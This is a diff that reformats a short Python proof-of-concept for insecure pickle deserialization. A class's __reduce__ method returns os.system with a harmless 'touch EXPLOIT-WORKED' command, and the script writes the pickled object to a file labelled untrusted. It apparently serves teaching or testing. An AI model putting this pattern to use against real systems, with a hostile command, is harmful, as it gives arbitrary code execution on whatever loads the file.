@@ -1,10 +1,12 @@
 import pickle
-import  os
+import os
+
 
 class MyExploit(object):
-        def __reduce__(object):
-            command = 'touch EXPLOIT-WORKED'
-            return (os.system, (command,))
+    def __reduce__(object):
+        command = 'touch EXPLOIT-WORKED'
+        return (os.system, (command,))
+
 
 serialized = pickle.dumps(MyExploit())
 filename = 'serialized.untrusted'
